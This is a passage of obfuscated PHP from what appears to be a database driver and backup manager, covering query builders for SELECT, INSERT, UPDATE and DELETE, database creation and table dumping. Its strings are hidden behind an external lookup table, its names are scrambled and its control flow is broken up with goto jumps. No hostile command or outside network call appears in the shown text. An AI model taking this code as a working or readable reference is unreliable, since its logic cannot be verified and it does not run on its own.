$Bä ŞºŒ–× = is_string($DàŠ½¤ÕÜù[1]) ? explode($aô»ßºõÇæ[47], $DàŠ½¤ÕÜù[1]) : $DàŠ½¤ÕÜù[1]; $BÙ‹óŒ™¦š .= $aô»ßºõÇæ[824] . $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $this->exp[$d¬²¹‘¼…„] . $aô»ßºõÇæ[50] . $this->parseValue($Bä ŞºŒ–×[0]) . $aô»ßºõÇæ[927] . $this->parseValue($Bä ŞºŒ–×[1]) . $aô»ßºõÇæ[266]; } else { think_exception(think_lang($aô»ßºõÇæ[930]) . $aô»ßºõÇæ[4] . $DàŠ½¤ÕÜù[0]); } } else { $aš‚÷’¶Ô½ = count($DàŠ½¤ÕÜù); $e¹µîœ×Æˆ = isset($DàŠ½¤ÕÜù[$aš‚÷’¶Ô½ - 1]) ? strtoupper($DàŠ½¤ÕÜù[$aš‚÷’¶Ô½ - 1]) : $aô»ßºõÇæ[33]; if (in_array($e¹µîœ×Æˆ, array($aô»ßºõÇæ[924], $aô»ßºõÇæ[925], $aô»ßºõÇæ[926]))) { $aš‚÷’¶Ô½ = $aš‚÷’¶Ô½ - 1; } else { $e¹µîœ×Æˆ = $aô»ßºõÇæ[924]; } for ($EäĞÒÎ”ÏÊ = 0; $EäĞÒÎ”ÏÊ < $aš‚÷’¶Ô½; $EäĞÒÎ”ÏÊ++) { $Bä ŞºŒ–× = is_array($DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ]) ? $DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ][1] : $DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ]; if ($aô»ßºõÇæ[285] == strtolower($DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ][0])) { $BÙ‹óŒ™¦š .= $aô»ßºõÇæ[248] . $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $Bä ŞºŒ–× . $aô»ßºõÇæ[941] . $e¹µîœ×Æˆ . $aô»ßºõÇæ[50]; } else { $f³Šğ‡…¶¥ = is_array($DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ]) ? $this->exp[strtolower($DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ][0])] : $aô»ßºõÇæ[916]; if (!$f³Šğ‡…¶¥ && is_array($DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ]) && in_array($DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ][0], array($aô»ßºõÇæ[916], $aô»ßºõÇæ[934], $aô»ßºõÇæ[935], $aô»ßºõÇæ[936], $aô»ßºõÇæ[937], $aô»ßºõÇæ[938]))) { $f³Šğ‡…¶¥ = $DàŠ½¤ÕÜù[$EäĞÒÎ”ÏÊ][0]; } $BÙ‹óŒ™¦š .= $aô»ßºõÇæ[248] . $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $f³Šğ‡…¶¥ . $aô»ßºõÇæ[50] . $this->parseValue($Bä ŞºŒ–×) . $aô»ßºõÇæ[941] . $e¹µîœ×Æˆ . $aô»ßºõÇæ[50]; } } $BÙ‹óŒ™¦š = substr($BÙ‹óŒ™¦š, 0, -4); } } else { $BÙ‹óŒ™¦š .= $E§¨¹¦íßÓ . $aô»ßºõÇæ[944] . $this->parseValue($DàŠ½¤ÕÜù); } return $BÙ‹óŒ™¦š; } protected function parseThinkWhere($E¬×›ÆÀÁš, $B›Ú˜µ İ) { $D›Àğ‹ =& $_SERVER[¯Ò¬Èè]; $B°§ˆ…ñÌ = $D›Àğ‹[33]; switch ($E¬×›ÆÀÁš) { case $D›Àğ‹[339]: $B°§ˆ…ñÌ = $B›Ú˜µ İ; break; case $D›Àğ‹[928]: $B°§ˆ…ñÌ = is_string($B›Ú˜µ İ) ? $B›Ú˜µ İ : substr($this->parseWhere($B›Ú˜µ İ), 6); break; case $D›Àğ‹[945]: parse_str($B›Ú˜µ İ, $C¯İâãæñ‚); if (isset($C¯İâãæñ‚[$D›Àğ‹[923]])) { $EæÂØšê«‰ = $D›Àğ‹[50] . strtoupper($C¯İâãæñ‚[$D›Àğ‹[923]]) . $D›Àğ‹[50]; unset($C¯İâãæñ‚[$D›Àğ‹[923]]); } else { $EæÂØšê«‰ = $D›Àğ‹[927]; } $cæ¨ÏòğŸ¢ = array(); foreach ($C¯İâãæñ‚ as $aÏ‚Ñ¹ˆÆà => $cµ‹Ëœ‹´£) { $cæ¨ÏòğŸ¢[] = $this->parseKey($aÏ‚Ñ¹ˆÆà) . $D›Àğ‹[944] . $this->parseValue($cµ‹Ëœ‹´£); } $B°§ˆ…ñÌ = implode($EæÂØšê«‰, $cæ¨ÏòğŸ¢); break; } return $B°§ˆ…ñÌ; } protected function parseLimit($F—Ô‘šãö) { $aÄ¸–‡±‚Ò =& $_SERVER[¯Ò¬Èè]; return !empty($F—Ô‘šãö) ? $aÄ¸–‡±‚Ò[48] . $F—Ô‘šãö . $aÄ¸–‡±‚Ò[50] : $aÄ¸–‡±‚Ò[33]; } protected function parseJoin($CÕ»ŞÓáó) { $fÅÌØï¤Ş =& $_SERVER[¯Ò¬Èè]; $aù´‘ëêªà = $fÅÌØï¤Ş[33]; if (!empty($CÕ»ŞÓáó)) { if (is_array($CÕ»ŞÓáó)) { foreach ($CÕ»ŞÓáó as $aÕªÀ§§ñ© => $cå÷–¥ùÎ) { if (!1 !== stripos($cå÷–¥ùÎ, $fÅÌØï¤Ş[946])) { $aù´‘ëêªà .= $fÅÌØï¤Ş[50] . $cå÷–¥ùÎ; } else { $aù´‘ëêªà .= $fÅÌØï¤Ş[947] . $cå÷–¥ùÎ; } } } else { $aù´‘ëêªà .= $fÅÌØï¤Ş[947] . $CÕ»ŞÓáó; } } $aù´‘ëêªà = preg_replace($fÅÌØï¤Ş[948], think_config($fÅÌØï¤Ş[851]) . $fÅÌØï¤Ş[949], $aù´‘ëêªà); return $aù´‘ëêªà; } protected function parseOrder($cÈ¯â¦‰Ò·) { $dŞƒºŸ‹Ì¥ =& $_SERVER[¯Ò¬Èè]; if (is_array($cÈ¯â¦‰Ò·)) { $Bí¡¤Ôºï­ = array(); foreach ($cÈ¯â¦‰Ò· as $aŒ×’¦©é£ => $F°óô¿™ª) { if (is_numeric($aŒ×’¦©é£)) { $Bí¡¤Ôºï­[] = $this->parseKey($F°óô¿™ª); } else { $F°óô¿™ª = in_array(strtoupper(trim($F°óô¿™ª)), array($dŞƒºŸ‹Ì¥[950], $dŞƒºŸ‹Ì¥[951])) ? $dŞƒºŸ‹Ì¥[50] . $F°óô¿™ª : $dŞƒºŸ‹Ì¥[33]; if (preg_match($dŞƒºŸ‹Ì¥[952], $aŒ×’¦©é£)) { $Bí¡¤Ôºï­[] = $this->parseKey($aŒ×’¦©é£) . $F°óô¿™ª; } else { think_exception($dŞƒºŸ‹Ì¥[953] . $aŒ×’¦©é£); } } } $cÈ¯â¦‰Ò· = implode($dŞƒºŸ‹Ì¥[47], $Bí¡¤Ôºï­); } return !empty($cÈ¯â¦‰Ò·) ? $dŞƒºŸ‹Ì¥[954] . $cÈ¯â¦‰Ò· : $dŞƒºŸ‹Ì¥[33]; } protected function parseGroup($c‡Ğ‘âßî§) { $E»ÆŒÊ¡¥ =& $_SERVER[¯Ò¬Èè]; return !empty($c‡Ğ‘âßî§) ? $E»ÆŒÊ¡¥[955] . $c‡Ğ‘âßî§ : $E»ÆŒÊ¡¥[33]; } protected function parseHaving($Cá„Ö¥ğ›) { $fØÛ’Êªõ¥ =& $_SERVER[¯Ò¬Èè]; return !empty($Cá„Ö¥ğ›) ? $fØÛ’Êªõ¥[956] . $Cá„Ö¥ğ› : $fØÛ’Êªõ¥[33]; } protected function parseComment($E¨ˆãƒ™¯) { $fÉ…ŸÊ‡â =& $_SERVER[¯Ò¬Èè]; return !empty($E¨ˆãƒ™¯) ? $fÉ…ŸÊ‡â[957] . $E¨ˆãƒ™¯ . $fÉ…ŸÊ‡â[958] : $fÉ…ŸÊ‡â[33]; } protected function parseDistinct($BÌ’‡ì‹£à) { $BîÑ™‘¢Œõ =& $_SERVER[¯Ò¬Èè]; return !empty($BÌ’‡ì‹£à) ? $BîÑ™‘¢Œõ[959] : $BîÑ™‘¢Œõ[33]; } protected function parseUnion($CÎäˆÇñëÄ) { $FœóöÇÑØÆ =& $_SERVER[¯Ò¬Èè]; if (empty($CÎäˆÇñëÄ)) { return $FœóöÇÑØÆ[33]; } if (isset($CÎäˆÇñëÄ[$FœóöÇÑØÆ[336]])) { $e”–­ĞâÚ = $FœóöÇÑØÆ[960]; unset($CÎäˆÇñëÄ[$FœóöÇÑØÆ[336]]); } else { $e”–­ĞâÚ = $FœóöÇÑØÆ[961]; } foreach ($CÎäˆÇñëÄ as $c„öæªš) { $bŒŒµÃ†¾™[] = $e”–­ĞâÚ . (is_array($c„öæªš) ? $this->buildSelectSql($c„öæªš) : $c„öæªš); } return implode($FœóöÇÑØÆ[50], $bŒŒµÃ†¾™); } public function insert($EâÚ¡ÀÜê„, $bÜ¬¸¼¹ö‡ = array(), $fåšŸ¦÷– = false) { goto CøÚÀÀˆ²¬; aÆñì‹Ô—ù: foreach ($EâÚ¡ÀÜê„ as $CÓ÷•ñĞ => $eßŒƒÚ¯š³) { if (is_array($eßŒƒÚ¯š³) && $eÕŞîŞé[285] == $eßŒƒÚ¯š³[0]) { $BĞƒŞÙêô¤[] = $this->parseKey($CÓ÷•ñĞ); $c‹åâ­ÂŠ¥[] = $eßŒƒÚ¯š³[1]; } elseif (is_scalar($eßŒƒÚ¯š³) || is_null($eßŒƒÚ¯š³)) { $BĞƒŞÙêô¤[] = $this->parseKey($CÓ÷•ñĞ); $c‹åâ­ÂŠ¥[] = $this->parseValue($eßŒƒÚ¯š³); } } $aŞ™¢ßÂ¡™ = ($fåšŸ¦÷– ? $eÕŞîŞé[828] : $eÕŞîŞé[829]) . $eÕŞîŞé[830] . $this->parseTable($bÜ¬¸¼¹ö‡[$eÕŞîŞé[267]]) . $eÕŞîŞé[824] . implode($eÕŞîŞé[47], $BĞƒŞÙêô¤) . $eÕŞîŞé[825] . implode($eÕŞîŞé[47], $c‹åâ­ÂŠ¥) . $eÕŞîŞé[826]; $aŞ™¢ßÂ¡™ .= $this->parseLock(isset($bÜ¬¸¼¹ö‡[$eÕŞîŞé[786]]) ? $bÜ¬¸¼¹ö‡[$eÕŞîŞé[786]] : !1); goto C¬³Î±ŸğÃ; CøÚÀÀˆ²¬: $eÕŞîŞé =& $_SERVER[¯Ò¬Èè]; $c‹åâ­ÂŠ¥ = $BĞƒŞÙêô¤ = array(); $this->model = $bÜ¬¸¼¹ö‡[$eÕŞîŞé[269]]; goto aÆñì‹Ô—ù; C¬³Î±ŸğÃ: $aŞ™¢ßÂ¡™ .= $this->parseComment(!empty($bÜ¬¸¼¹ö‡[$eÕŞîŞé[341]]) ? $bÜ¬¸¼¹ö‡[$eÕŞîŞé[341]] : $eÕŞîŞé[33]); return $this->execute($aŞ™¢ßÂ¡™, $this->parseBind(!empty($bÜ¬¸¼¹ö‡[$eÕŞîŞé[273]]) ? $bÜ¬¸¼¹ö‡[$eÕŞîŞé[273]] : array())); goto E”–‡Ó–•; E”–‡Ó–•: } public function selectInsert($dº¢æåÛÖß, $d‚‚‘ò‹‚Ö, $CµÂèõ¨‘Š = array()) { goto d²…«¢…; D«ÅéÍ¾Ú‹: array_walk($dº¢æåÛÖß, array($this, $bæšÒ“‰Êê[827])); $bİ¬×èØ‰¡ = $bæšÒ“‰Êê[962] . $this->parseTable($d‚‚‘ò‹‚Ö) . $bæšÒ“‰Êê[824] . implode($bæšÒ“‰Êê[47], $dº¢æåÛÖß) . $bæšÒ“‰Êê[941]; $bİ¬×èØ‰¡ .= $this->buildSelectSql($CµÂèõ¨‘Š); goto Fß¤ªÍ­Ù; d²…«¢…: $bæšÒ“‰Êê =& $_SERVER[¯Ò¬Èè]; $this->model = $CµÂèõ¨‘Š[$bæšÒ“‰Êê[269]]; if (is_string($dº¢æåÛÖß)) { $dº¢æåÛÖß = explode($bæšÒ“‰Êê[47], $dº¢æåÛÖß); } goto D«ÅéÍ¾Ú‹; Fß¤ªÍ­Ù: return $this->execute($bİ¬×èØ‰¡, $this->parseBind(!empty($CµÂèõ¨‘Š[$bæšÒ“‰Êê[273]]) ? $CµÂèõ¨‘Š[$bæšÒ“‰Êê[273]] : array())); goto d÷ˆÆˆëÒƒ; d÷ˆÆˆëÒƒ: } public function update($Dğò³»éÈ´, $f¹Âõà–î) { $F¿×‰ÂøİŠ =& $_SERVER[¯Ò¬Èè]; $this->model = $f¹Âõà–î[$F¿×‰ÂøİŠ[269]]; $d¸ò¬¦—õ± = $F¿×‰ÂøİŠ[963] . $this->parseTable($f¹Âõà–î[$F¿×‰ÂøİŠ[267]]) . $this->parseSet($Dğò³»éÈ´) . $this->parseWhere(!empty($f¹Âõà–î[$F¿×‰ÂøİŠ[263]]) ? $f¹Âõà–î[$F¿×‰ÂøİŠ[263]] : $F¿×‰ÂøİŠ[33]) . $this->parseOrder(!empty($f¹Âõà–î[$F¿×‰ÂøİŠ[350]]) ? $f¹Âõà–î[$F¿×‰ÂøİŠ[350]] : $F¿×‰ÂøİŠ[33]) . $this->parseLimit(!empty($f¹Âõà–î[$F¿×‰ÂøİŠ[280]]) ? $f¹Âõà–î[$F¿×‰ÂøİŠ[280]] : $F¿×‰ÂøİŠ[33]) . $this->parseLock(isset($f¹Âõà–î[$F¿×‰ÂøİŠ[786]]) ? $f¹Âõà–î[$F¿×‰ÂøİŠ[786]] : !1) . $this->parseComment(!empty($f¹Âõà–î[$F¿×‰ÂøİŠ[341]]) ? $f¹Âõà–î[$F¿×‰ÂøİŠ[341]] : $F¿×‰ÂøİŠ[33]); return $this->execute($d¸ò¬¦—õ±, $this->parseBind(!empty($f¹Âõà–î[$F¿×‰ÂøİŠ[273]]) ? $f¹Âõà–î[$F¿×‰ÂøİŠ[273]] : array())); } public function delete($CáÙ¯‹ = array()) { $C‰ƒ¹ö =& $_SERVER[¯Ò¬Èè]; $this->model = $CáÙ¯‹[$C‰ƒ¹ö[269]]; $Cƒ©±©ç¿È = $C‰ƒ¹ö[964] . $this->parseTable($CáÙ¯‹[$C‰ƒ¹ö[267]]) . $this->parseWhere(!empty($CáÙ¯‹[$C‰ƒ¹ö[263]]) ? $CáÙ¯‹[$C‰ƒ¹ö[263]] : $C‰ƒ¹ö[33]) . $this->parseOrder(!empty($CáÙ¯‹[$C‰ƒ¹ö[350]]) ? $CáÙ¯‹[$C‰ƒ¹ö[350]] : $C‰ƒ¹ö[33]) . $this->parseLimit(!empty($CáÙ¯‹[$C‰ƒ¹ö[280]]) ? $CáÙ¯‹[$C‰ƒ¹ö[280]] : $C‰ƒ¹ö[33]) . $this->parseLock(isset($CáÙ¯‹[$C‰ƒ¹ö[786]]) ? $CáÙ¯‹[$C‰ƒ¹ö[786]] : !1) . $this->parseComment(!empty($CáÙ¯‹[$C‰ƒ¹ö[341]]) ? $CáÙ¯‹[$C‰ƒ¹ö[341]] : $C‰ƒ¹ö[33]); return $this->execute($Cƒ©±©ç¿È, $this->parseBind(!empty($CáÙ¯‹[$C‰ƒ¹ö[273]]) ? $CáÙ¯‹[$C‰ƒ¹ö[273]] : array())); } public function select($FĞ–„ÄœÉ‚ = array()) { goto fñâáÚô‡ñ; dĞÉ¶Üæ ¾: $bÃÜí™‘Œ = isset($FĞ–„ÄœÉ‚[$B¡Öçø–ˆË[337]]) ? $FĞ–„ÄœÉ‚[$B¡Öçø–ˆË[337]] : !1; if ($bÃÜí™‘Œ) { $DõßÚˆ‘øÍ = is_string($bÃÜí™‘Œ[$B¡Öçø–ˆË[89]]) ? $bÃÜí™‘Œ[$B¡Öçø–ˆË[89]] : $B¡Öçø–ˆË[965] . md5($b‹¥×˜ù¸); $CĞáÏŞ¿  = think_cache($DõßÚˆ‘øÍ, $B¡Öçø–ˆË[33], $bÃÜí™‘Œ); if (!1 !== $CĞáÏŞ¿ ) { return $CĞáÏŞ¿ ; } } $cÂ¿ÑÙÂÙ = $this->query($b‹¥×˜ù¸, $this->parseBind(!empty($FĞ–„ÄœÉ‚[$B¡Öçø–ˆË[273]]) ? $FĞ–„ÄœÉ‚[$B¡Öçø–ˆË[273]] : array())); goto B¼¡Ü‰ÕÕÓ; fñâáÚô‡ñ: $B¡Öçø–ˆË =& $_SERVER[¯Ò¬Èè]; $this->model = $FĞ–„ÄœÉ‚[$B¡Öçø–ˆË[269]]; $b‹¥×˜ù¸ = $this->buildSelectSql($FĞ–„ÄœÉ‚); goto dĞÉ¶Üæ ¾; B¼¡Ü‰ÕÕÓ: if ($bÃÜí™‘Œ && !1 !== $cÂ¿ÑÙÂÙ) { think_cache($DõßÚˆ‘øÍ, $cÂ¿ÑÙÂÙ, $bÃÜí™‘Œ); } return $cÂ¿ÑÙÂÙ; goto còõÙ³’¡†; còõÙ³’¡†: } public function buildSelectSql($Dß°ÅÊíì = array()) { goto Eëˆ½ÅéŠØ; C—‡‰É¼¡¦: return $EÇŸ¯¤Ô; goto D°ÖàÌÉÎÁ; Eëˆ½ÅéŠØ: $CŒÀ©Ä®Üç =& $_SERVER[¯Ò¬Èè]; if (isset($Dß°ÅÊíì[$CŒÀ©Ä®Üç[340]])) { if (strpos($Dß°ÅÊíì[$CŒÀ©Ä®Üç[340]], $CŒÀ©Ä®Üç[47])) { list($eö¦½ÀöŞŞ, $C˜ˆŸ§ğŒÔ) = explode($CŒÀ©Ä®Üç[47], $Dß°ÅÊíì[$CŒÀ©Ä®Üç[340]]); } else { $eö¦½ÀöŞŞ = $Dß°ÅÊíì[$CŒÀ©Ä®Üç[340]]; } $eö¦½ÀöŞŞ = $eö¦½ÀöŞŞ ? $eö¦½ÀöŞŞ : 1; $C˜ˆŸ§ğŒÔ = isset($C˜ˆŸ§ğŒÔ) ? $C˜ˆŸ§ğŒÔ : (is_numeric($Dß°ÅÊíì[$CŒÀ©Ä®Üç[280]]) ? $Dß°ÅÊíì[$CŒÀ©Ä®Üç[280]] : 20); $BÛéÀ¢ª– = $C˜ˆŸ§ğŒÔ * ((int) $eö¦½ÀöŞŞ - 1); $Dß°ÅÊíì[$CŒÀ©Ä®Üç[280]] = $BÛéÀ¢ª– . $CŒÀ©Ä®Üç[47] . $C˜ˆŸ§ğŒÔ; } if (think_config($CŒÀ©Ä®Üç[966])) { $a¸Æ±Å´Áô = $CŒÀ©Ä®Üç[967] . md5(serialize($Dß°ÅÊíì)); $fƒºŒ÷ù÷ƒ = think_cache($a¸Æ±Å´Áô); if ($fƒºŒ÷ù÷ƒ) { return $fƒºŒ÷ù÷ƒ; } } goto c‹øä¥ÅĞ¼; c‹øä¥ÅĞ¼: $EÇŸ¯¤Ô = $this->parseSql($this->selectSql, $Dß°ÅÊíì); $EÇŸ¯¤Ô .= $this->parseLock(isset($Dß°ÅÊíì[$CŒÀ©Ä®Üç[786]]) ? $Dß°ÅÊíì[$CŒÀ©Ä®Üç[786]] : !1); if (isset($a¸Æ±Å´Áô)) { think_cache($a¸Æ±Å´Áô, $EÇŸ¯¤Ô); } goto C—‡‰É¼¡¦; D°ÖàÌÉÎÁ: } public function parseSql($Fùíà»áíÊ, $f©ë­ªšÃï = array()) { $f†ŠÏÀ® =& $_SERVER[¯Ò¬Èè]; $Fùíà»áíÊ = str_replace(array($f†ŠÏÀ®[968], $f†ŠÏÀ®[969], $f†ŠÏÀ®[970], $f†ŠÏÀ®[971], $f†ŠÏÀ®[972], $f†ŠÏÀ®[973], $f†ŠÏÀ®[974], $f†ŠÏÀ®[975], $f†ŠÏÀ®[976], $f†ŠÏÀ®[977], $f†ŠÏÀ®[978]), array($this->parseTable("{$f©ë­ªšÃï[$f†ŠÏÀ®[267]]}"), $this->parseDistinct(isset($f©ë­ªšÃï[$f†ŠÏÀ®[979]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[979]] : !1), $this->parseField(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[261]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[261]] : $f†ŠÏÀ®[176]), $this->parseJoin(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[270]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[270]] : $f†ŠÏÀ®[33]), $this->parseWhere(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[263]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[263]] : $f†ŠÏÀ®[33]), $this->parseGroup(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[980]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[980]] : $f†ŠÏÀ®[33]), $this->parseHaving(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[981]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[981]] : $f†ŠÏÀ®[33]), $this->parseOrder(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[350]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[350]] : $f†ŠÏÀ®[33]), $this->parseLimit(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[280]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[280]] : $f†ŠÏÀ®[33]), $this->parseUnion(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[335]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[335]] : $f†ŠÏÀ®[33]), $this->parseComment(!empty($f©ë­ªšÃï[$f†ŠÏÀ®[341]]) ? $f©ë­ªšÃï[$f†ŠÏÀ®[341]] : $f†ŠÏÀ®[33])), $Fùíà»áíÊ); return $Fùíà»áíÊ; } public function getLastSql($aò…é·ÍêÜ = '') { return $aò…é·ÍêÜ ? $this->modelSql[$aò…é·ÍêÜ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($f¸–Ö§êÁÚ) { return addslashes($f¸–Ö§êÁÚ); } public function setModel($bä±‘ÏŒ²) { $this->model = $bä±‘ÏŒ²; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($FĞİÆéÏ¾, $Fï÷–ˆö½± = '') { $this->database = $FĞİÆéÏ¾; $this->type = $Fï÷–ˆö½±; } public function model($a†èÉœ¯ = '') { return new ModelBase($a†èÉœ¯, $_SERVER[¯Ò¬Èè][33], $this->database); } public function db($A¾ìÔÜ®…’ = false) { goto D­Ø ‹ØÚù; D­Ø ‹ØÚù: $Fº³‡»öª =& $_SERVER[¯Ò¬Èè]; $C°°à‚§†ã = array_change_key_case($this->database); if ($this->type == $Fº³‡»öª[9] || !$A¾ìÔÜ®…’) { return $this->model()->db(); } goto c¿‚Á§ÎèÂ; C³Œë¨ÄØ¹: if (!$Aó‚ŸóÓ¶Ã) { $fŞ¾ˆÎ‰â‚->execute("\143\x72\145\141\164\145\x20\x64\x61\x74\x61\x62\x61\x73\x65\x20\140{$eĞî·ùÂßğ}\140"); } $C°°à‚§†ã[$Fº³‡»öª[894]] = $eĞî·ùÂßğ; if ($C°°à‚§†ã[$Fº³‡»öª[737]] == $Fº³‡»öª[738]) { $C°°à‚§†ã[$Fº³‡»öª[739]] .= $Fº³‡»öª[982] . $eĞî·ùÂßğ; } goto Eë¤ÇŸ‚½; Eë¤ÇŸ‚½: $this->database = $C°°à‚§†ã; $fŞ¾ˆÎ‰â‚->execute("\165\163\x65\x20\x60{$eĞî·ùÂßğ}\140"); return $fŞ¾ˆÎ‰â‚; goto Aê–ãË; c¿‚Á§ÎèÂ: $eĞî·ùÂßğ = $C°°à‚§†ã[$Fº³‡»öª[894]]; $C°°à‚§†ã[$Fº³‡»öª[894]] = $Fº³‡»öª[33]; if ($C°°à‚§†ã[$Fº³‡»öª[737]] == $Fº³‡»öª[738]) { $dêì›Ã±ô’ = $C°°à‚§†ã[$Fº³‡»öª[739]]; $C°°à‚§†ã[$Fº³‡»öª[739]] = substr($dêì›Ã±ô’, 0, strrpos($dêì›Ã±ô’, $Fº³‡»öª[982])); } goto DèŒ½¬‰Û¾; DèŒ½¬‰Û¾: $this->database = $C°°à‚§†ã; $fŞ¾ˆÎ‰â‚ = $this->model()->db(); try { $Aó‚ŸóÓ¶Ã = $fŞ¾ˆÎ‰â‚->execute("\x73\150\157\167\40\144\141\x74\141\142\x61\163\x65\163\40\154\151\x6b\x65\x20\47{$eĞî·ùÂßğ}\x27"); } catch (Exception $bŞÆœ—¾†) { } goto C³Œë¨ÄØ¹; Aê–ãË: } public function createTable($Dæ³¦ÈĞ¿ä, $cŞŠâæ¿ = null) { $Dğ—ãêºƒ =& $_SERVER[¯Ò¬Èè]; if (!IO::exist($Dæ³¦ÈĞ¿ä)) { show_json(LNG($Dğ—ãêºƒ[983]), !1); } $DÎ¾¾ôª‹½ = sqlSplit(IO::getContent($Dæ³¦ÈĞ¿ä)); foreach ($DÎ¾¾ôª‹½ as $cÁì—ñŒ™×) { if ($cŞŠâæ¿) { $FŠ´Úš†ƒì = stripos($cÁì—ñŒ™×, $Dğ—ãêºƒ[984]) === 0; if ($FŠ´Úš†ƒì) { $cŞŠâæ¿->task[$Dğ—ãêºƒ[985]] += 1; } } $this->model()->db()->execute($cÁì—ñŒ™×); if ($cŞŠâæ¿ && $FŠ´Úš†ƒì) { preg_match($Dğ—ãêºƒ[986], $cÁì—ñŒ™×, $DÃ¶Â‹®ä); $cŞŠâæ¿->task[$Dğ—ãêºƒ[987]] = $DÃ¶Â‹®ä[1]; $cŞŠâæ¿->update(1); } } $this->taskToCache($cŞŠâæ¿); } public function insertTable($BÙ“¾ø«¡É, $bÎ‰“§Š×© = null) { $cÅÌÕæ†Ãì =& $_SERVER[¯Ò¬Èè]; $d†‚ò†æÅ = $this->model()->db(); $b±ºç•®¨ˆ = $EâğÇö…æ‡ ? array($EâğÇö…æ‡) : $d†‚ò†æÅ->getTables(); foreach ($BÙ“¾ø«¡É as $eß†ÖîùÈ) { $EâğÇö…æ‡ = basename($eß†ÖîùÈ, $cÅÌÕæ†Ãì[732]); if (!in_array($EâğÇö…æ‡, $b±ºç•®¨ˆ)) { continue; } if ($bÎ‰“§Š×©) { $bÎ‰“§Š×©->task[$cÅÌÕæ†Ãì[987]] = $EâğÇö…æ‡; } if (get_filesize($eß†ÖîùÈ) == 0) { continue; } $dŸó­‰›Ù¥ = $this->sqlToDb($eß†ÖîùÈ, $bÎ‰“§Š×©); if (!$dŸó­‰›Ù¥) { show_json(LNG($cÅÌÕæ†Ãì[988]) . "\x5b{$EâğÇö…æ‡}\135", !1); } } $this->taskToCache($bÎ‰“§Š×©); } public function sqlFromDb($CÏÏòìÑ¤³, $CİãßÎ”Ç—, $f¬¸çÊ×î† = null, $c¢ˆ”Ş«î… = null) { goto a¾Ş’âŒŠ; C®«´”©³õ: $C±áÇ·îĞ­ = $Dê°öàÙ¨->getPk(); $b®õ‚ñÑØ = $Dê°öàÙ¨->getDbFields(); do { $A­„ßìäÅ¶ = $Dê°öàÙ¨->field($b®õ‚ñÑØ)->order($C±áÇ·îĞ­ . $_SERVER[¯Ò¬Èè][990])->selectPage($cµ³Í­ÃÕ, $F¾©Óâæ¶Ø); $B©‰ÇÃë¡ = isset($A­„ßìäÅ¶[$_SERVER[¯Ò¬Èè][351]][$_SERVER[¯Ò¬Èè][353]]) ? $A­„ßìäÅ¶[$_SERVER[¯Ò¬Èè][351]][$_SERVER[¯Ò¬Èè][353]] : 0; $bà’¯ÃÈà† = !empty($A­„ßìäÅ¶[$_SERVER[¯Ò¬Èè][354]]) ? $A­„ßìäÅ¶[$_SERVER[¯Ò¬Èè][354]] : array(); if (!($F›‹ËŒ»Ş¼ = count($bà’¯ÃÈà†))) { break; } $c›¸Ï—§‚ö = array(); foreach ($bà’¯ÃÈà† as $a¤£ßº¤šÍ) { if ($CÏÏòìÑ¤³ == $_SERVER[¯Ò¬Èè][991] && $a¤£ßº¤šÍ[$_SERVER[¯Ò¬Èè][29]] == $_SERVER[¯Ò¬Èè][992]) { $eÉĞßæ§´ = json_decode($a¤£ßº¤šÍ[$_SERVER[¯Ò¬Èè][359]], !0); if ($eÉĞßæ§´[$_SERVER[¯Ò¬Èè][28]] == date($_SERVER[¯Ò¬Èè][704]) && !$eÉĞßæ§´[$_SERVER[¯Ò¬Èè][703]]) { continue; } } if ($c¢ˆ”Ş«î…) { $a¤£ßº¤šÍ[$_SERVER[¯Ò¬Èè][75]] = "\173\x69\157\72{$c¢ˆ”Ş«î…}\175" . substr($a¤£ßº¤šÍ[$_SERVER[¯Ò¬Èè][75]], strlen("\173\x69\157\x3a{$a¤£ßº¤šÍ[$_SERVER[¯Ò¬Èè][758]]}\x7d")); $a¤£ßº¤šÍ[$_SERVER[¯Ò¬Èè][758]] = $c¢ˆ”Ş«î…; } $c›¸Ï—§‚ö[] = $_SERVER[¯Ò¬Èè][993] . $this->sqlEncode($a¤£ßº¤šÍ) . $_SERVER[¯Ò¬Èè][994]; } $FÖÁÈ˜§­ = "\111\116\123\x45\122\124\x20\111\116\x54\x4f\40\140{$CÏÏòìÑ¤³}\x60\x20\50\140" . implode($_SERVER[¯Ò¬Èè][995], $b®õ‚ñÑØ) . $_SERVER[¯Ò¬Èè][996]; fwrite($F·Ä¡¹Ì›·, $FÖÁÈ˜§­ . implode($_SERVER[¯Ò¬Èè][997], $c›¸Ï—§‚ö) . $_SERVER[¯Ò¬Èè][67] . PHP_EOL); $F¾©Óâæ¶Ø++; $cÉÍ²âìÜŞ += $F›‹ËŒ»Ş¼; if ($f¬¸çÊ×î†) { $f¬¸çÊ×î†->update($F›‹ËŒ»Ş¼); } } while ($F¾©Óâæ¶Ø <= $B©‰ÇÃë¡); goto fäÄè‘Õ; D§¿Óêâ‘¸: $F¾©Óâæ¶Ø = 1; $cµ³Í­ÃÕ = 500; 